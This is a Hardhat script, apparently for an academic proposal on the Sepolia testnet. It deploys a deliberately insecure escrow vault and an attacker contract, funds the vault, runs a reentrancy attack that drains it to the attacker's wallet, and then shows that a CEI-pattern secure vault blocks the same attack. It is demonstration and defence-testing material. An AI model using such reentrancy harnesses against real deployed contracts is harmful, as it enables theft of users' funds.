// Sepolia test — EXACT amounts from Kolokium proposal
// Total honeypot: 2.3 ETH (Buyer A: 1.5 ETH, Buyer B: 0.8 ETH)
// Attacker deposit: 0.1 ETH
const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [wallet] = await ethers.getSigners();
  const bal = await ethers.provider.getBalance(wallet.address);
  console.log(`Wallet: ${wallet.address}`);
  console.log(`Balance: ${ethers.formatEther(bal)} ETH`);
  console.log(`Required: 2.4 ETH for deposits + ~0.01 ETH for gas`);
  console.log(`Sufficient: ${bal > ethers.parseEther("2.5") ? "✅ YES" : "⚠️ MUNGKIN KURANG"}\n`);

  // ─── DEPLOY ───
  console.log("=== 1. DEPLOY CONTRACTS ===");
  const InsecureVault = await ethers.getContractFactory("InsecureVault");
  const insecure = await InsecureVault.deploy();
  await insecure.waitForDeployment();
  const insecureAddr = await insecure.getAddress();
  let r = await insecure.deploymentTransaction().wait();
  console.log(`InsecureVault: ${insecureAddr} (${r.gasUsed} gas)`);

  const SecureVault = await ethers.getContractFactory("SecureVault");
  const secure = await SecureVault.deploy();
  await secure.waitForDeployment();
  const secureAddr = await secure.getAddress();
  r = await secure.deploymentTransaction().wait();
  console.log(`SecureVault:   ${secureAddr} (${r.gasUsed} gas)`);

  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(insecureAddr);
  await attacker.waitForDeployment();
  const attackerAddr = await attacker.getAddress();
  r = await attacker.deploymentTransaction().wait();
  console.log(`Attacker:      ${attackerAddr} (${r.gasUsed} gas)\n`);

  // ─── HONEYPOT SETUP (PROPOSAL: 2.3 ETH) ───
  console.log("=== 2. HONEYPOT: 2.3 ETH (sesuai proposal) ===");
  const fakeSeller = ethers.Wallet.createRandom().address;

  // Buyer A: 1.5 ETH
  console.log("\nBuyer A deposits 1.5 ETH...");
  let tx = await insecure.createOrder(fakeSeller);
  await tx.wait();
  tx = await insecure.depositFunds(0, { value: ethers.parseEther("1.5") });
  await tx.wait();
  tx = await insecure.confirmDelivery(0);
  await tx.wait();
  console.log("  ✅ 1.5 ETH deposited (simulasi 1 ton komoditas)");

  // Buyer B: 0.8 ETH
  console.log("\nBuyer B deposits 0.8 ETH...");
  tx = await insecure.createOrder(fakeSeller);
  await tx.wait();
  tx = await insecure.depositFunds(1, { value: ethers.parseEther("0.8") });
  await tx.wait();
  tx = await insecure.confirmDelivery(1);
  await tx.wait();
  console.log("  ✅ 0.8 ETH deposited (simulasi pembayaran parsial)");

  // Attacker: 0.1 ETH (as seller)
  console.log("\nAttacker deposits 0.1 ETH (as seller)...");
  tx = await insecure.createOrder(attackerAddr);
  await tx.wait();
  tx = await insecure.depositFunds(2, { value: ethers.parseEther("0.1") });
  await tx.wait();
  tx = await insecure.confirmDelivery(2);
  await tx.wait();
  console.log("  ✅ 0.1 ETH deposited (deposit minimal penyerang)");

  const vaultBal = await insecure.getContractBalance();
  const attackerVaultBal = await insecure.getBalance(attackerAddr);
  console.log(`\n  ┌─────────────────────┬─────────────┐`);
  console.log(`  │ Vault total         │ ${ethers.formatEther(vaultBal).padStart(9)} ETH │`);
  console.log(`  │ Buyer A + B (target)│    2.3 ETH │`);
  console.log(`  │ Attacker balance    │    0.1 ETH │`);
  console.log(`  └─────────────────────┴─────────────┘`);
  console.log(`  Honeypot: 2.3 ETH ← target penyerang\n`);

  // ─── EXECUTE ATTACK ───
  console.log("=== 3. REENTRANCY ATTACK ON SEPOLIA ===");
  const vBefore = await insecure.getContractBalance();
  const aBefore = await ethers.provider.getBalance(attackerAddr);

  console.log("Menjalankan attack()... (membutuhkan ~30 reentrancy loops)");
  tx = await attacker.attack({ gasLimit: 500000 });
  r = await tx.wait();
  console.log(`\n  Attack gas used: ${r.gasUsed}`);
  console.log(`  Gas price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei`);
  console.log(`  TX cost: ${ethers.formatEther(r.gasUsed * r.gasPrice)} ETH`);

  const reentryCount = await attacker.getReentrancyCount();
  const vAfter = await insecure.getContractBalance();
  const aAfter = await ethers.provider.getBalance(attackerAddr);
  const profit = aAfter - ethers.parseEther("0.1"); // profit = final - deposit 0.1 ETH

  console.log(`\n  Reentrancy loops: ${reentryCount}`);
  console.log(`  Vault: ${ethers.formatEther(vBefore)} → ${ethers.formatEther(vAfter)} ETH`);
  console.log(`  Attacker contract: ${ethers.formatEther(aAfter)} ETH`);
  console.log(`  Attacker deposit:  0.1 ETH`);
  console.log(`  Illegal profit:    ${ethers.formatEther(profit)} ETH`);

  if (profit > 0n) {
    console.log("\n  🔴 ATTACK BERHASIL! Penyerang mendapatkan untung ilegal!");
    console.log(`  Total ditarik: ${ethers.formatEther(aAfter)} ETH (modal 0.1 + curian ${ethers.formatEther(profit)})`);

    tx = await attacker.collectFunds();
    await tx.wait();
    const walletBal = await ethers.provider.getBalance(wallet.address);
    console.log(`  Dana exfiltrated ke wallet ✅`);
    console.log(`  Wallet balance: ${ethers.formatEther(walletBal)} ETH`);
  } else {
    console.log("\n  🟢 ATTACK GAGAL — kontrak aman");
  }

  // ─── CEI PREVENTION ───
  console.log("\n=== 4. CEI PREVENTION TEST ===");
  const Attacker2 = await ethers.getContractFactory("Attacker");
  const attacker2 = await Attacker2.deploy(secureAddr);
  await attacker2.waitForDeployment();
  const attacker2Addr = await attacker2.getAddress();
  console.log(`Attacker2 (target: SecureVault): ${attacker2Addr}`);

  // Setup: 1.5 ETH for legit, 0.1 ETH for attacker
  tx = await secure.createOrder(fakeSeller);
  await tx.wait();
  tx = await secure.depositFunds(0, { value: ethers.parseEther("1.5") });
  await tx.wait();
  tx = await secure.confirmDelivery(0);
  await tx.wait();
  console.log("  ✅ Deposit 1.5 ETH untuk pembeli legitimate");

  tx = await secure.createOrder(attacker2Addr);
  await tx.wait();
  tx = await secure.depositFunds(1, { value: ethers.parseEther("0.1") });
  await tx.wait();
  tx = await secure.confirmDelivery(1);
  await tx.wait();
  console.log("  ✅ Deposit 0.1 ETH untuk attacker (as seller)");

  try {
    tx = await attacker2.attack({ gasLimit: 500000 });
    r = await tx.wait();
    console.log(`  ⚠️  Attack on SecureVault: ${r.gasUsed} gas (unexpected success)`);
  } catch (err) {
    console.log(`  ✅ CEI Pattern MENCEGAH reentrancy! TX REVERTED.`);
    console.log(`  SecureVault tetap aman — saldo penyerang 0 sebelum .call()`);
  }

  // ─── FINAL SUMMARY ───
  console.log("\n══════════════════════════════════════════════");
  console.log("  FINAL RESULTS — SEPOLIA (sesuai proposal)");
  console.log("══════════════════════════════════════════════");
  console.log(`  Honeypot:             2.3 ETH (proposal: ✅)`);
  console.log(`  Attacker deposit:     0.1 ETH (proposal: ✅)`);
  console.log(`  Attack status:        ${profit > 0n ? '🔴 BERHASIL' : '🟢 GAGAL'}`);
  console.log(`  Attack gas:           ${r?.gasUsed || 'N/A'} gas`);
  console.log(`  CEI Prevention:       ✅ BERHASIL`);
  console.log("══════════════════════════════════════════════\n");

  console.log("Simpan address ini untuk .env:");
  console.log(`INsecure_Vault_ADDR=${insecureAddr}`);
  console.log(`SECURE_VAULT_ADDR=${secureAddr}`);
  console.log(`ATTACKER_ADDR=${attackerAddr}`);
}

main().catch(console.error);
